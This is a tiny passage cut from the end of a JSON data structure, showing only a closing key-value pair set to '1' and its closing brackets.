y":"1"}]}}]}